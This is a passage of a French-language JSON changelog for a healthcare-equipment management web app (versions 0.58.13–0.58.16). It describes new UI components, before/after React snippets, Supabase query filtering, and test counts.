          "after": "// 0.58.16 - hook réutilisable avec auto-flip\nimport { useDropdownPosition, dropdownPositionStyle } from './useDropdownPosition';\n\nconst rootRef = useRef(null);\nconst [open, setOpen] = useState(false);\nconst flipUp = useDropdownPosition(rootRef, open, { maxHeight: 320 });\n\n<div style={{\n  position: 'absolute',\n  ...dropdownPositionStyle(flipUp),  // ← top OU bottom selon position\n  ...\n}}>\n  Dropdown content\n</div>\n\n// Le hook :\n//   • Calcule spaceBelow = vh - rect.bottom - margin\n//   • Calcule spaceAbove = rect.top - margin\n//   • Flip si spaceBelow < maxHeight ET spaceAbove > spaceBelow\n//   • Recalcule au scroll et resize"
        }
      },
      { "code": "AI", "txt": "+28 tests Vitest (v058-16-hotfix-ui.test.js) : version+SW (2), Fix 1 padding (3 — desktop calc 140 + mobile calc 160 + plus de 110 hardcodé), Fix 2 z-index menu (3 — overlay 9998 + drawer 9999 + position fixed conservée), Hook useDropdownPosition (6 — use client + exports + getBoundingClientRect + spaceBelow/Above + flip logic + scroll/resize listeners + cleanup + helper bottom/top), Application Select (4 — import + hook maxHeight 320 + spread style + plus de top hardcodé), TimePicker (3 — import + hook maxHeight 280 + spread), RangePicker (3 — import + hook maxHeight 280 + spread), Combobox (3 — import + hook maxHeight 320 + spread), DatePicker non concerné (1 — input type=date natif). +2 ajustements anciens tests 0.56.16 (regex acceptant nouvelles valeurs). Total 3770 verts (+28 nets)" },
      { "code": "DOC", "txt": "HOTFIX critique sur 3 bugs UI signalés. (a) Les pages au contenu long (Profil, Statistiques) ne sont plus coupées au bas — le padding inclut env(safe-area-inset-bottom) pour gérer correctement les iPhones avec home indicator. (b) Le menu burger fonctionne maintenant sur TOUTES les pages, plus seulement /accueil — les z-index très hauts (9998/9999) garantissent qu'aucun widget fixed ne peut le masquer. (c) Les dropdowns custom (Select, TimePicker, RangePicker, Combobox) s'ouvrent intelligemment vers le haut quand le trigger est en bas de l'écran, évitant les coupures. Hook useDropdownPosition réutilisable pour de futurs composants" }
    ],
    "themes": ["bugfix", "ui"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.16.html",
    "sqlFile": null
  },
  {
    "v": "0.58.15",
    "kind": "version",
    "titre": "🎨 UI PHASE 14 : CodeBlock + RangePicker branché queries Supabase + Lien Onboarding + Tooltips partout + ProgressBar exports + Drawer détail intervention",
    "chantiers": [
      { "code": "UI", "txt": "📋 COMPOSANT CODEBLOCK premium (app/components/ui-premium/CodeBlock.js, 320 lignes). Bloc de code/JSON/SQL avec coloration syntaxique légère + bouton 'Copier' avec feedback temporaire. (a) Highlight JSON : keys teal #7CC8C8 bold, strings green pâle, numbers violet pâle, booleans/null amber. (b) Highlight SQL : ~40 keywords (SELECT/FROM/WHERE/JOIN/etc) en teal, strings, numbers, commentaires --. (c) 4 variants thématiques (default navy / danger #2a1517 / success #16241a / info #152030). (d) Numéros de ligne en table avec userSelect:none (copie propre). (e) maxHeight scrollable (défaut 360). (f) Bouton Copier avec navigator.clipboard.writeText + fallback execCommand pour anciens navigateurs. (g) Feedback visuel 1.8s 'Copié !' (couleur accent + icon ti-check). (h) Header avec language label + line count. (i) Props : code, language, lineNumbers, maxHeight, variant, title, showCopy, wrap, ariaLabel. (j) A11y : role region + ariaLabel auto",
        "code_snippet": {
          "file": "app/components/ui-premium/CodeBlock.js",
          "note": "JSON/SQL highlight + copie",
          "lang": "jsx",
          "before": "// AVANT 0.58.15 - <pre><code> nu sans coloration\n<pre style={{ background: '#142131', color: '#fff' }}>\n  <code>{JSON.stringify(data, null, 2)}</code>\n</pre>\n// → illisible, pas de copie, pas de scroll géré, pas de langue affichée",
          "after": "// 0.58.15 - CodeBlock premium\n<CodeBlock\n  code={JSON.stringify(adminPayload, null, 2)}\n  language='json'\n  title='Payload de la requête'\n  lineNumbers\n  maxHeight={400}\n/>\n\n// Pour du SQL avec variant danger (erreur)\n<CodeBlock\n  code={`SELECT * FROM patients\nWHERE etablissement_id = 'xxx'\n-- ERREUR : structure_id manquant`}\n  language='sql'\n  variant='danger'\n/>\n\n// → keys/strings/numbers/booleans colorés\n//   bouton 'Copier' avec feedback 'Copié !',\n//   numéros de ligne table userSelect:none"
        }
      },
      { "code": "UI", "txt": "📅 BRANCHEMENT RANGEPICKER /statistiques sur queries Supabase. Le filtre est maintenant pleinement fonctionnel. (a) Calcul automatique de dateFromISO/dateFromDate et dateToISO/dateToDate selon range.from et range.to. (b) Fallback : si pas de range, comportement historique (6 derniers mois). (c) Helpers applyToISO(q, col) et applyToDate(q, col) qui ajoutent .lte() seulement si dateTo défini. (d) Les 5 queries principales (interventions, transferts, maintenances, signalements) utilisent ces helpers — sauf stock_articles qui n'a pas de date. (e) useEffect dépend de range.from + range.to → re-fetch automatique au changement. (f) Subtitle dynamique : 'Période : 4 mars → 4 juin 2026' avec dates formatées court, sinon 'Tableaux de bord visuels — 6 derniers mois'. (g) Message 'Filtre appliqué' vert ✓ (au lieu de l'ancien 'Filtre actif — recharger les données pour appliquer')",
        "code_snippet": {
          "file": "app/statistiques/page.js",
          "note": "RangePicker enfin actif sur les queries",
          "lang": "jsx",
          "before": "// AVANT 0.58.15 - RangePicker en UI mais pas branché\nconst sixMois = new Date(Date.now() - 6 * 30 * 86400000).toISOString();\n\nawait Promise.all([\n  supabase.from('interventions').select(...).gte('created_at', sixMois),\n  supabase.from('transferts').select(...).gte('created_at', sixMois),\n  ...\n]);\n// → le RangePicker ne servait à rien, plage fixe 6 mois",
          "after": "// 0.58.15 - branchement complet\n// Calcul dynamique des bornes selon range\nlet dateFromISO, dateFromDate, dateToISO, dateToDate;\nif (range.from) {\n  dateFromISO = new Date(range.from + 'T00:00:00').toISOString();\n  dateFromDate = range.from;\n} else {\n  dateFromISO = new Date(Date.now() - 6 * 30 * 86400000).toISOString();\n  dateFromDate = dateFromISO.slice(0, 10);\n}\nif (range.to) {\n  dateToISO = new Date(range.to + 'T23:59:59').toISOString();\n  dateToDate = range.to;\n}\n\n// Helpers : appliquer .lte() seulement si dateTo défini\nconst applyToISO = (q, col) => dateToISO ? q.lte(col, dateToISO) : q;\nconst applyToDate = (q, col) => dateToDate ? q.lte(col, dateToDate) : q;\n\nawait Promise.all([\n  applyToISO(supabase.from('interventions').select(...).gte('created_at', dateFromISO), 'created_at'),\n  applyToISO(supabase.from('transferts').select(...).gte('created_at', dateFromISO), 'created_at'),\n  applyToDate(supabase.from('maintenances').select(...).gte('date_prevue', dateFromDate), 'date_prevue'),\n  ...\n]);\n\n// Et la deps du useEffect inclut range.from + range.to → re-fetch auto\n}, [auth.ready, auth.structureId, auth.etablissements, range.from, range.to]);"
        }
      },
      { "code": "UI", "txt": "👥 LIEN ONBOARDING GUIDÉ depuis /utilisateurs. Nouveau bouton lavande à côté du bouton 'Créer un utilisateur' existant qui pointe vers /onboarding (la nouvelle page wizard de 0.58.14). (a) Style cohérent : gradient lavande rgba(122,111,176, .12) avec border .30 et color #5d52a0. (b) Icon ti-wand + label 'Onboarding guidé'. (c) Badge 'NEW' en pill lavande 9px uppercase pour signaler la nouveauté. (d) Hover : background plus opaque + translateY(-1px) + shadow lavande. (e) Visible uniquement si auth.can('inviter') (sécurité). Le user peut choisir entre le formulaire rapide existant ou le wizard guidé en 4 étapes",
        "code_snippet": {
          "file": "app/utilisateurs/page.js",
          "note": "Raccourci vers wizard onboarding",
          "lang": "jsx",
          "before": "// AVANT 0.58.15 - la page /onboarding existait mais cachée\n// → aucun lien depuis /utilisateurs, l'utilisateur devait taper l'URL manuellement",
          "after": "// 0.58.15 - lien visible dans la barre d'actions de l'onglet Invitations\n{auth.can('inviter') && <button className='btn-new' onClick={...}>\n  <i className='ti ti-user-plus' /> Créer un utilisateur\n</button>}\n\n{/* Nouveau bouton vers le wizard */}\n{auth.can('inviter') && (\n  <a\n    href='/onboarding'\n    style={{\n      background: 'linear-gradient(135deg, rgba(122,111,176,.12), rgba(122,111,176,.06))',\n      border: '1px solid rgba(122,111,176,.30)',\n      color: '#5d52a0',\n      ...\n    }}\n  >\n    <i className='ti ti-wand' />\n    Onboarding guidé\n    <span className='badge-new'>NEW</span>\n  </a>\n)}"
        }
      },
      { "code": "UI", "txt": "💬 TOOLTIPS PARTOUT (déploiement Tooltip premium). (a) NotifBell : le title HTML statique 'Notifications' est remplacé par un Tooltip dynamique 'Notifications · X non lue(s)' (position bottom, delay 500ms) qui change selon le compteur. (b) /interventions : date relative dans le tableau est wrappée d'un Tooltip qui affiche au hover la date complète avec heure ('lundi 4 juin 2026 à 14:32') — dateStyle:'full', timeStyle:'short' — avec underline dotted pour signaler le hover. (c) /interventions : badge transfert_id (icon ti-transfer dans la cellule numéro) avec Tooltip 'Un transfert (reprise matériel) a déjà été généré pour cette intervention'. (d) /interventions : bouton 'Détails' avec Tooltip position left 'Voir tous les détails dans un panneau latéral'. Le tout avec arrow CSS pure + auto-flip si débord viewport",
        "code_snippet": {
          "file": "app/NotifBell.js + app/interventions/page.js",
          "note": "Tooltips premium remplaçant les title HTML moches",
          "lang": "jsx",
          "before": "// AVANT 0.58.15 - title HTML natif (délai navigateur ~1.5s, style gris OS)\n<button title='Notifications'>🔔</button>\n\n<td>{fmtDate(r.created_at)}</td>\n\n{r.transfert_id && <i className='ti ti-transfer' title='Transfert généré' />}",
          "after": "// 0.58.15 - Tooltips premium avec délai paramétrable + arrow CSS + auto-flip\n<Tooltip\n  content={nonLues > 0\n    ? `Notifications · ${nonLues} non lue${nonLues > 1 ? 's' : ''}`\n    : 'Notifications'\n  }\n  position='bottom'\n  delay={500}\n>\n  <button>🔔</button>\n</Tooltip>\n\n// Date avec tooltip date+heure complète\n<td>\n  <Tooltip\n    content={new Date(r.created_at).toLocaleString('fr-FR', {\n      dateStyle: 'full', timeStyle: 'short'\n    })}\n    position='top'\n    delay={300}\n  >\n    <span style={{ cursor: 'help', textDecoration: 'underline dotted' }}>\n      {fmtDate(r.created_at)}\n    </span>\n  </Tooltip>\n</td>\n\n// Badge transfert avec explication contextuelle\n<Tooltip content='Un transfert (reprise matériel) a déjà été généré pour cette intervention'>\n  <i className='ti ti-transfer' style={{ cursor: 'help' }} />\n</Tooltip>"
        }
      },
      { "code": "UI", "txt": "📊 PROGRESSBAR DANS EXPORTS LOURDS. (1) /interventions bulk CSV >100 lignes : state exportProgress = { value, total } + ProgressBar floating en bas centre (position fixed, animation av-bulk-toolbar-in slide-up) avec showPercent et compteur 'value / total'. Yield au DOM tous les BATCH=50 items via Promise(setTimeout 0) pour ne pas freezer l'UI. (2) /statistiques export Excel complet (exportBilan) : state bilanExporting + ProgressBar mode indeterminate variant=success affichée juste sous la barre RangePicker pendant la génération (au lieu de bloquer toute la page avec setLoading(true) comme avant). Card avec gradient teal subtil + icon ti-file-spreadsheet + label 'Génération du bilan complet en cours…'",
        "code_snippet": {
          "file": "app/interventions/page.js + app/statistiques/page.js",
          "note": "Feedback visuel pour exports lourds",
          "lang": "jsx",
          "before": "// AVANT 0.58.15 - aucun feedback sur exports lourds\nasync function bulkExportCsv() {\n  // Boucle synchrone — freeze UI pour 200+ lignes\n  for (const r of subset) lines.push(...);\n  downloadCsv(lines);\n}\n\n// Stats Excel : bloque toute la page avec setLoading(true)\nawait exportBilan(data);",
          "after": "// 0.58.15 - Bulk CSV avec ProgressBar floating\nconst useProgress = total > 100;\nif (useProgress) setExportProgress({ value: 0, total });\n\nconst BATCH = 50;\nfor (let i = 0; i < total; i++) {\n  lines.push(formatLine(subset[i]));\n  if (useProgress && (i + 1) % BATCH === 0) {\n    setExportProgress({ value: i + 1, total });\n    await new Promise((res) => setTimeout(res, 0));  // yield DOM\n  }\n}\n\n{/* JSX floating en bas */}\n{exportProgress && (\n  <ProgressBar\n    value={(exportProgress.value / exportProgress.total) * 100}\n    label={`Export en cours… (${exportProgress.value} / ${exportProgress.total})`}\n    showPercent\n  />\n)}\n\n// Stats Excel : ProgressBar indeterminate inline (UI reste utilisable)\n{bilanExporting && (\n  <ProgressBar indeterminate variant='success'\n    label='Génération du bilan complet en cours…' />\n)}"
        }
      },
      { "code": "UI", "txt": "🔧 DRAWER DE DÉTAIL INTERVENTION dans /interventions. Nouveau bouton 'Détails' (icon ti-layout-sidebar-right-expand) dans chaque ligne du tableau. Click → ouvre un Drawer side='right' size='md' (480px) avec toutes les infos de la DI dans une vue confortable. (a) Header : numéro 22px + status tag + urgence à droite. (b) Grid 2 colonnes : Type (avec typeIcon), Créée le (dateStyle:short + timeStyle:short), Échéance, Assigné (avec Avatar). (c) Carte Matériel concerné en bleu (background gradient #185FA5 alpha .06) avec libellé + SN + parc. (d) Carte Patient concerné en violet avec Avatar 36px + chambre. (e) Description multiline avec whiteSpace:pre-wrap. (f) Section Actions disponibles : boutons Réassigner / Générer transfert / ou message vert 'Un transfert a déjà été généré'. (g) Footer : Fermer + bouton 'Passer à « Suivant »' si statut suivant possible. Excellente vue tablette/mobile",
        "code_snippet": {
          "file": "app/interventions/page.js",
          "note": "Drawer riche de détail (alternative au modal pour vue full)",
          "lang": "jsx",
          "before": "// AVANT 0.58.15 - infos dispersées dans la cellule du tableau\n// → matériel sur 2 lignes, patient ailleurs, description tronquée à 50 chars,\n//   pas d'historique visible, actions noyées dans la dernière colonne",
          "after": "// 0.58.15 - bouton Détails par ligne → Drawer riche\n<Tooltip content='Voir tous les détails dans un panneau latéral'>\n  <button className='btn-mini' onClick={() => setDetailDi(r)}>\n    <i className='ti ti-layout-sidebar-right-expand' /> Détails\n  </button>\n</Tooltip>\n\n<Drawer\n  open={!!detailDi}\n  onClose={() => setDetailDi(null)}\n  title={`Intervention ${detailDi?.numero}`}\n  subtitle={`${detailDi?.type} · ${detailDi?.urgence}`}\n  icon='ti-tools'\n  side='right'\n  size='md'\n  footer={<>\n    <button onClick={close}>Fermer</button>\n    {next(detailDi.statut) && (\n      <button onClick={() => { advance(detailDi); close(); }}>\n        Passer à « {next(detailDi.statut)} »\n      </button>\n    )}\n  </>}\n>\n  {/* Numéro 22px + status + urgence */}\n  {/* Grid 2 cols : Type / Créée / Échéance / Assigné */}\n  {/* Carte matériel bleue avec SN/parc */}\n  {/* Carte patient violette avec Avatar */}\n  {/* Description multiline */}\n  {/* Actions disponibles : Réassigner / Transfert / message */}\n</Drawer>"
        }
      },
      { "code": "AI", "txt": "+47 tests Vitest (v058-15-ui-phase14.test.js) : version+SW (2), CodeBlock (10 — use client + props + helpers JSON/SQL + 4 highlight classes + SQL keywords + 4 variants + copy avec feedback 1.8s + fallback execCommand + line numbers userSelect:none + index), Branchement RangePicker (8 — calcul dateFrom/To ISO/Date + fallback 6 mois + helpers applyTo + queries enveloppées + deps useEffect range + subtitle dynamique + 'Filtre appliqué' vert + setLoading), Lien Onboarding (5 — href + permission inviter + icon ti-wand + badge NEW + hover translateY), Tooltips (4 — NotifBell import + content dynamique + title supprimé + dates + transfert badge), ProgressBar exports (7 — interventions import + state exportProgress + seuil 100 + BATCH 50 yield + JSX floating + stats import + bilanExporting indeterminate + plus de setLoading bloquant), Drawer détail intervention (9 — Drawer import + state detailDi + bouton Détails + side+size+title + footer Fermer+Suivant + numéro+status + carte matériel SN/parc + carte patient Avatar + description+actions), Récap 20 composants (1). +1 ajustement test 0.58.13 (regex Drawer pour supporter Tooltip ajouté). Total 3742 verts" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.15 : 20 composants premium au total (ajout CodeBlock). Le RangePicker de /statistiques est ENFIN actif et filtre les données. Les exports lourds (bulk CSV >100, bilan Excel) ont maintenant un feedback de progression. Le Drawer de détail intervention transforme la vue tableau étroite en panneau latéral confortable. Tooltips premium déployés stratégiquement (NotifBell, dates relatives, badges). Le lien Onboarding rend la page wizard découvrable. Prochaines pistes : (a) Drawer pour édition patient (alternative au modal géant existant). (b) Drawer pour édition matériel (mêmes principes). (c) Composant Toast Stack premium (plusieurs toasts visibles en simultané, stacking). (d) Skeleton premium pour le Drawer de détail (pendant le fetch supabase). (e) Tooltip sur les boutons du modal Nouvelle DI (matériel/patient searchable, dépôt/zone). (f) CodeBlock dans /admin/state pour le payload JSON" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.15.html",
    "sqlFile": null
  },
  {
    "v": "0.58.14",
    "kind": "version",
    "titre": "🎨 UI PHASE 13 : ProgressBar + Tooltip + BulkToolbar dans /interventions + RangePicker dans /statistiques + Wizard onboarding",
    "chantiers": [
      { "code": "UI", "txt": "📊 COMPOSANT PROGRESSBAR (app/components/ui-premium/ProgressBar.js, 110 lignes). Barre de progression linéaire avec gradient et glow. (a) Value clampé 0-100 automatiquement. (b) 3 tailles (sm 4px / md 8px / lg 12px). (c) 4 variants : default (teal), success (green), danger (terra), navy. (d) Mode indeterminate (animation sweep gauche→droite 1.4s infinie). (e) Brillance subtile au sommet de la barre (gradient white 25% → transparent). (f) Label optionnel + showPercent (avec font-variant-numeric tabular). (g) Transition width 300ms cubic-bezier pour les updates de valeur. (h) A11y : role progressbar + aria-valuenow/min/max/text + aria-valuetext français",
        "code_snippet": {
          "file": "app/components/ui-premium/ProgressBar.js",
          "note": "Progress bar avec mode déterminé + indeterminate",
          "lang": "jsx",
          "before": "// AVANT 0.58.14 - pas de composant standard\n// → solutions ad-hoc avec divs + width % partout",
          "after": "// 0.58.14 - ProgressBar premium\n// Upload avec %\n<ProgressBar value={uploadProgress} label='Upload en cours…' showPercent />\n\n// Export lourd avec mode indeterminate\n<ProgressBar indeterminate label='Génération du PDF…' variant='success' />\n\n// Validation (taille large + couleur danger)\n<ProgressBar value={errorPct} size='lg' variant='danger' label='Erreurs détectées' showPercent />\n\n// → glow autour de la barre, brillance subtile au sommet,\n//   transition 300ms cubic-bezier, a11y complet"
        }
      },
      { "code": "UI", "txt": "💬 COMPOSANT TOOLTIP premium (app/components/ui-premium/Tooltip.js, 220 lignes). Wrapper qui ajoute un tooltip stylé au hover ou focus. (a) 4 positions (top/bottom/left/right) + auto-flip si débord viewport. (b) Délai paramétrable (défaut 400ms). (c) MaxWidth configurable (défaut 240px). (d) Arrow CSS pure via borders (4 directions). (e) Animation av-tooltip-in 200ms (fade + scale 0.85→1). (f) Position fixed + getBoundingClientRect pour calcul précis. (g) Cleanup timeout au unmount pour éviter fuites. (h) Show sur mouseenter ET focus (a11y clavier). (i) Background navy + shadow profonde. (j) A11y : role=tooltip + aria-describedby + pointer-events:none pour ne pas bloquer le hover du parent",
        "code_snippet": {
          "file": "app/components/ui-premium/Tooltip.js",
          "note": "Tooltip premium avec auto-positioning",
          "lang": "jsx",
          "before": "// AVANT 0.58.14 - title HTML natif moche\n<button title='Supprimer cet item'>\n  <i className='ti ti-trash' />\n</button>\n// → délai navigateur de ~1.5s, style natif gris, pas de styling possible",
          "after": "// 0.58.14 - Tooltip premium\n<Tooltip content='Supprimer cet item' position='top' delay={300}>\n  <button>\n    <i className='ti ti-trash' />\n  </button>\n</Tooltip>\n\n// Avec contenu riche\n<Tooltip\n  content={<><b>Astuce</b><br />Cmd+K pour la recherche globale</>}\n  position='bottom'\n  maxWidth={280}\n>\n  <i className='ti ti-info-circle' />\n</Tooltip>\n\n// → délai paramétrable, arrow CSS pure,\n//   auto-flip si débord, animation pop"
        }
      },
      { "code": "UI", "txt": "🛠️ INTÉGRATION BULKTOOLBAR DANS /interventions. (a) Nouvelle colonne checkbox en première position du tableau (head + body). Checkbox 'Tout sélectionner' qui sélectionne tous les éléments visibles. (b) State `selected: Set<id>` + helpers toggleSelected / clearSelected. (c) Lignes sélectionnées mises en évidence avec background teal subtil. (d) 3 actions bulk : 'Marquer résolue' (Dialog.confirm + update statut), 'Exporter CSV' (téléchargement avec BOM UTF-8 + séparateur ;), 'Supprimer' (Dialog.confirm danger + delete bulk). (e) Toutes les confirmations passent par Dialog premium (au lieu de window.confirm natif)",
        "code_snippet": {
          "file": "app/interventions/page.js",
          "note": "Multi-sélection avec actions groupées",
          "lang": "jsx",
          "before": "// AVANT 0.58.14 - aucune multi-sélection\n// → 'Pour clôturer 12 DI : cliquer chaque ligne, bouton Suivant, etc' (pénible)",
          "after": "// 0.58.14 - bulk-select fluide\nconst [selected, setSelected] = useState(new Set());\n\n// Checkbox 'Tout sélectionner' dans thead\n<input\n  type='checkbox'\n  checked={visible.length > 0 && visible.every(r => selected.has(r.id))}\n  onChange={(e) => {\n    e.target.checked\n      ? setSelected(new Set(visible.map(r => r.id)))\n      : clearSelected();\n  }}\n/>\n\n// Toolbar contextuelle apparaît dès 1 sélection\n<BulkToolbar\n  count={selected.size}\n  onClear={clearSelected}\n  itemName='intervention'\n  itemNamePlural='interventions'\n  actions={[\n    { id: 'close',  label: 'Marquer résolue', icon: 'ti-circle-check', onClick: bulkClose },\n    { id: 'export', label: 'Exporter CSV',   icon: 'ti-download',     onClick: bulkExportCsv },\n    { id: 'delete', label: 'Supprimer',      icon: 'ti-trash',        onClick: bulkDelete, variant: 'danger' },\n  ]}\n/>"
        }
      },
      { "code": "UI", "txt": "📅 INTÉGRATION RANGEPICKER DANS /statistiques. Nouvelle barre de filtre période juste après le PageHero avec icon ti-filter + label 'Période d'analyse :' + composant RangePicker. State `range = { from, to }` ajouté. Affichage d'un message d'info quand un filtre est actif. (Note : la query Supabase utilisera ce range dans une prochaine itération — pour cette release, la mécanique UI est en place et fonctionnelle)" },
      { "code": "UI", "txt": "👤 PAGE /onboarding — Wizard nouveau collaborateur en 4 étapes avec Stepper. (a) Étape 1 Identité : nom + prénom + email avec validation regex live + preview Avatar dynamique. (b) Étape 2 Rôle : Select premium size=lg avec 4 rôles (admin / manager / utilisateur / lecture seule), chacun avec icon coloré + desc. Card preview du rôle sélectionné. (c) Étape 3 Permissions : Combobox tags avec 9 permissions granulaires (patients lecture/écriture/suppression, matériel lecture/écriture, interventions, transferts, stats, exports). (d) Étape 4 Invitation : récap complet avec Avatar 52px + role badge avec icon + permissions tags + message 'Email d'activation envoyé à...'. (e) Footer Stepper standardisé avec submitLabel='Envoyer l'invitation' + busy state. (f) handleCancel demande confirmation via Dialog.confirm si données saisies. (g) handleSubmit appelle supabase.functions.invoke('invite-user'). PageHero variant='violet' avec breadcrumbs",
        "code_snippet": {
          "file": "app/onboarding/page.js (430 lignes)",
          "note": "Wizard onboarding nouveau collaborateur",
          "lang": "jsx",
          "before": "// AVANT 0.58.14 - une seule modale Modal géante avec 30 champs\n// → utilisateur perdu, validation difficile, abandon fréquent",
          "after": "// 0.58.14 - Wizard guidé en 4 étapes\nconst [step, setStep] = useState(0);\n\n<Stepper active={step} onStepClick={setStep} steps={STEPS} />\n\n<Stepper.Body active={step}>\n  {step === 0 && <FormIdentite />}      {/* nom + email + Avatar preview */}\n  {step === 1 && <FormRole />}          {/* Select premium + card desc */}\n  {step === 2 && <FormPermissions />}   {/* Combobox tags */}\n  {step === 3 && <RecapInvitation />}   {/* card complète + send */}\n</Stepper.Body>\n\n<Stepper.Footer\n  active={step}\n  total={STEPS.length}\n  onPrev={() => setStep(step - 1)}\n  onNext={() => setStep(step + 1)}\n  onSubmit={handleSubmit}\n  nextDisabled={!canGoNext()}\n  busy={busy}\n  submitLabel=\"Envoyer l'invitation\"\n/>"
        }
      },
      { "code": "AI", "txt": "+48 tests Vitest (v058-14-ui-phase13.test.js) : version+SW (2), ProgressBar (8 — use client + props + clamp + 3 sizes + 4 variants + indeterminate + a11y + brillance + index), Tooltip (10 — use client + props + 4 positions + show/hide + cleanup + getBoundingClientRect + arrow CSS + animation + a11y + focus a11y + index), BulkToolbar dans /interventions (8 — import + state Set + 3 bulkActions + Dialog.confirm + checkbox header + checkbox row + BulkToolbar variant danger + CSV BOM UTF-8), RangePicker dans /statistiques (4 — import + state + JSX + barre filter), Page /onboarding (12 — use client + 4 steps + 4 roles + 9 permissions + email regex + Stepper.Body/Footer + Select role + Combobox permissions + récap + invite-user + Dialog cancel + PageHero violet), Récap 19 composants (1). Total 3695 verts (+48)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.14 : 19 composants premium au total (ajout ProgressBar, Tooltip). La page /interventions devient une vraie interface professionnelle avec multi-sélection bulk. La page /statistiques a maintenant un filtre période RangePicker (à brancher sur les queries dans une prochaine itération). Nouvelle page /onboarding accessible via lien 'Inviter un collaborateur' depuis /utilisateurs (à câbler côté liste). Prochaines pistes : (a) Brancher le filtre RangePicker de /statistiques sur les queries Supabase pour appliquer le filtre temporel. (b) Ajouter le lien vers /onboarding depuis /utilisateurs. (c) Tooltip partout (boutons icons sans label, dates relatives, status pills). (d) ProgressBar dans les exports lourds (/statistiques PDF, /interventions bulk CSV avec >100 lignes). (e) Composant Code Block premium (pour afficher du JSON dans /admin)" }
    ],
    "themes": ["ui", "design-system"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.14.html",
    "sqlFile": null
  },
  {
    "v": "0.58.13",
    "kind": "version",
    "titre": "🎨 UI PHASE 12 : RangePicker + Stepper + BulkToolbar + Refonte NotifBell en Drawer + Migration dialogs.alert legacy",
    "chantiers": [
      { "code": "UI", "txt": "📅 COMPOSANT RANGEPICKER (app/components/ui-premium/RangePicker.js, 260 lignes). Sélecteur de plage de dates avec dropdown 2 colonnes. (a) Colonne gauche : 5 presets cliquables (7 derniers jours, 30 derniers jours, 3 derniers mois, 6 derniers mois, Cette année) avec icon ti-clock-bolt. (b) Colonne droite : 2 inputs date 'Du' et 'Au' avec contraintes min/max croisées (from <= to automatique). (c) Boutons 'Effacer' + 'Appliquer' (désactivé si vide). (d) Affichage formaté français court (4 juin 2026 → 4 juin 2026). (e) Helpers internes : shiftDays(n), shiftMonths(n), formatDateFR(iso). (f) Click outside ferme. (g) Trigger button cohérent avec DatePicker (icon ti-calendar-stats, ring teal au focus, clear ×). (h) Presets customisables via prop 'presets'",
        "code_snippet": {
          "file": "app/components/ui-premium/RangePicker.js",
          "note": "Sélection de plage avec presets",
          "lang": "jsx",
          "before": "// AVANT 0.58.13 - 2 inputs date séparés sans presets\n<input type='date' value={dateFrom} onChange={(e) => setDateFrom(e.target.value)} />\n<input type='date' value={dateTo} onChange={(e) => setDateTo(e.target.value)} />\n// → 5 clics pour sélectionner 30 derniers jours",
          "after": "// 0.58.13 - RangePicker premium\nconst [range, setRange] = useState({ from: '', to: '' });\n\n<RangePicker\n  value={range}\n  onChange={setRange}\n/>\n\n// → 1 clic sur preset '30 derniers jours' = du 4 mai au 4 juin 2026 appliqués\n// → ou inputs custom avec contraintes min/max auto"
        }
      },
      { "code": "UI", "txt": "🎯 COMPOSANT STEPPER (app/components/ui-premium/Stepper.js, 280 lignes) — wizard multi-étapes avec progression visuelle. (a) Barre horizontale avec N étapes : cercle numéroté + label + sub-label optionnel. (b) 3 états : done (gradient teal + check icon + shadow), current (gradient navy + glow blanc 4px), future (gris). (c) Trait connecteur entre étapes : gradient teal si done, gris sinon. (d) Cercles cliquables pour reculer (par défaut) ou allowSkipForward pour permettre de sauter vers n'importe quelle étape. (e) 3 tailles (sm 28px / md 32px / lg 36px). (f) Sub-exports prêts à l'emploi : Stepper.Body (animation slide horizontal lors du changement d'étape via key) + Stepper.Footer (prev/next/submit standardisés, avec indicateur 'Étape X sur N', bouton submit en gradient vert success sur la dernière étape, support busy state). (g) A11y : aria-current=step + role navigation",
        "code_snippet": {
          "file": "app/components/ui-premium/Stepper.js",
          "note": "Wizard multi-étapes prêt à l'emploi",
          "lang": "jsx",
          "before": "// AVANT 0.58.13 - pas de composant standard pour wizards\n// → Chaque assistant ad-hoc avec breadcrumb perso, état perso,\n//   boutons précédent/suivant dupliqués partout",
          "after": "// 0.58.13 - Stepper standardisé\nconst [step, setStep] = useState(0);\nconst steps = [\n  { label: 'Informations', sub: 'Identité' },\n  { label: 'Adresse',      sub: 'Domicile' },\n  { label: 'Couverture',   sub: 'AMO + AMC' },\n  { label: 'Validation',   sub: 'Récap' },\n];\n\n<Stepper active={step} onStepClick={setStep} steps={steps} />\n\n<Stepper.Body active={step}>\n  {step === 0 && <FormInfos />}\n  {step === 1 && <FormAdresse />}\n  {step === 2 && <FormCouverture />}\n  {step === 3 && <Recap />}\n</Stepper.Body>\n\n<Stepper.Footer\n  active={step}\n  total={steps.length}\n  onPrev={() => setStep(step - 1)}\n  onNext={() => setStep(step + 1)}\n  onSubmit={handleSubmit}\n  busy={loading}\n/>"
        }
      },
      { "code": "UI", "txt": "🛠️ COMPOSANT BULKTOOLBAR (app/components/ui-premium/BulkToolbar.js, 180 lignes) — action bar contextuelle qui apparaît quand des items sont sélectionnés en bulk. (a) Position fixed centrée bas d'écran (ou top), pill arrondi avec gradient navy + 3 ombres profondes. (b) Compteur badge avec gradient teal + shadow, pluralisation française auto. (c) Actions horizontales avec hover background blanc translucide, support variant='danger' en rouge tendre. (d) Bouton close (×) avec rotation 90° au hover. (e) Animation av-bulk-toolbar-in 350ms (slide-up + scale 0.92→1 + fade). (f) Display count mémorisé pour éviter le flash '0' pendant l'animation de sortie. (g) Props : count, onClear, actions[{ id, label, icon, onClick, variant, disabled }], position ('bottom'|'top'), itemName/itemNamePlural pour i18n du label",
        "code_snippet": {
          "file": "app/components/ui-premium/BulkToolbar.js",
          "note": "Action bar bulk-select fixed bottom",
          "lang": "jsx",
          "before": "// AVANT 0.58.13 - aucune ergonomie multi-sélection\n// → 'Pour sélectionner plusieurs : cocher chaque case, scroll vers le haut,\n//    cliquer sur bouton Actions dans la TopBar' (mauvais)",
